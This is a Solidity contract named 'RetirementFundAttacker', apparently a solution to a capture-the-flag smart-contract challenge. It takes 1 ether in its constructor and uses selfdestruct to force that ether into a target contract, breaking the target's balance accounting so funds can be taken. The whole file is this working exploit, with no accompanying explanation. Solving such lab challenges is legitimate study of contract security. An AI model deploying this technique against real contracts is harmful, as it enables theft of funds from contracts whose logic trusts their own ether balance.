// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

contract RetirementFundAttacker {
    address retirementFund;

    constructor(address _retirementFund) payable {
        require(msg.value == 1 ether);
        retirementFund = _retirementFund;
    }

    function attack() public {
        selfdestruct(payable(retirementFund));
    }
}
